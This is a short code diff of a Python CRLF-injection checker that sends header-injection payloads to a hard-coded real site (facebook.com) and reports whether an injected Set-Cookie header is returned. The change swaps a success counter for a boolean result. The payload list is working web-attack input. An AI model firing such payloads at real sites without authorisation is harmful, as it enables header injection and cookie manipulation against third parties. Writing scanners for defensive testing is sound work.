@@ -4,9 +4,9 @@ import requests
 url = "https://facebook.com"
 
 
-def check_crlf_injection(url):
+def check_crlf_vuln(url):
 
-    nr_successful_payloads = 0
+    is_vulnerable=False
 
     crlf_payload=[
     '/%%0a0aSet-Cookie:crlf=injection',
@@ -36,9 +36,9 @@ def check_crlf_injection(url):
         response = requests.request("GET", url)
         if "Set-Cookie" in response.headers:
             if 'crlf=injection' in response.headers['Set-Cookie']:
-                nr_successful_payloads+=1
+                is_vulnerable=True
 
 
-    print(f'Successfully injected {nr_successful_payloads} payloads')
+    return is_vulnerable
 
-check_crlf_injection(url)
+#print(check_crlf_vuln(url))
